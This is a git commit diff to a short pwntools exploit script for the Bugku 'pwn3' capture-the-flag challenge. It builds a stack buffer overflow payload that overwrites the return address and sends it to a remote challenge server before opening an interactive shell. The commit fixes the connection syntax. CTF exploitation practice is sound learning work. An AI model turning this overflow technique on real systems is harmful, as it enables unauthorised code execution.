902176304c3ee13498b6ef1af195c292bf69b65f
ZYA <zyazhb@yahoo.com>
2019-03-13 17:30:18 +0800

    Update exp.py

--- bugku/pwn3/exp.py
+++ bugku/pwn3/exp.py
@@ -4,8 +4,7 @@ junk = "A" * 0x30
 #address = "\x96\x05\x40\x00\x00\x00\x00"
 payload = junk + p64(0x400751)
 
-# Io = process("./pwn3")
-Io = remote(("114.116.54.89", 10003))
-
-Io.send(payload)
+#Io = process("./pwn3")
+Io = remote("114.116.54.89",10003)
+Io.sendline(payload)
 Io.interactive()
